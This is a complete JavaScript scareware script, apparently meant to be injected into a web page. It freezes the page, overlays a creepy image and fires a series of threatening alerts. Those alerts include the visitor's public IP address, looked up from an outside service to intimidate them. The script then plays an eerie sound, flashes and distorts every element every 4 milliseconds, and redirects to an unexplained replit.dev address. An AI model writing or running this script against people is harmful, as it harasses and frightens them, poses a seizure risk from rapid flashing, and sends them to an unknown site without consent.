(async () => {
    // Pause all videos
    document.querySelectorAll('video').forEach(v => v.pause());

    // Freeze page interactions
    document.body.style.pointerEvents = 'none';
    document.body.style.userSelect = 'none';

    // Black overlay
    const overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;background:black;z-index:9999;';
    document.body.appendChild(overlay);

    // Creepy GIF
    const gif = document.createElement('img');
    gif.src = 'https://media.tenor.com/S4IgNAEu0UAAAAAM/creepy.gif';
    gif.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%, -50%);cursor:pointer;z-index:10000;';
    overlay.appendChild(gif);

    // Corrupt GIF on click
    gif.addEventListener('click', () => {
        gif.src = Array.from(gif.src).reverse().join('');
    });

    // First alerts after 5 seconds
    setTimeout(async () => {
        // Fetch public IP
        const fetched = await fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => data.ip);

        const messages = [
            "Consoquences",
            "Consoquences that are Serious",
            "Do you have any idea what you have done",
            "You let HIM in your computer",
            "And you are fucked up,",
            fetched
        ];

        for (const msg of messages) await new Promise(resolve => { alert(msg); resolve(); });

        // Play sound
        const audio = new Audio('https://github.com/ivorydevrimoalt/YoutubeJavascriptUltimate/raw/refs/heads/main/creepster.wav');
        audio.play();

        // Additional alert sequence after sound
        const moreAlerts = [
            "It never ends...",
            "You should have left now.",
            "He is inside.",
            "You cannot escape.",
            "Do you feel it?",
            "Your screen is cursed."
        ];

        for (const msg of moreAlerts) await new Promise(resolve => { alert(msg); resolve(); });

    }, 5000);

    // Start continuous chaos after 15 seconds
    setTimeout(() => {
        const elements = document.querySelectorAll('a, span, h1, h2, h3, h4, h5, h6, p, div, li, button');

        const chaosInterval = setInterval(() => {
            elements.forEach(el => {
                el.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
                el.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
                const scale = Math.random() * 2 + 0.5;
                const rotate = Math.random() * 360;
                const skewX = Math.random() * 60 - 30;
                const skewY = Math.random() * 60 - 30;
                el.style.transform = `scale(${scale}) rotate(${rotate}deg) skew(${skewX}deg, ${skewY}deg)`;
                el.style.fontSize = `${Math.random() * 40 + 10}px`;
            });
        }, 4); // every 4 milliseconds

        // Redirect 5 seconds after chaos starts
        setTimeout(() => {
            clearInterval(chaosInterval); // stop chaos before redirect
            window.location.href = "https://5350e3cc-8969-43ab-bac1-ede7758d636d-00-18wgrshg6l4lg.janeway.replit.dev";
        }, 5000); // 5 seconds after chaos starts
    }, 15000);
})();
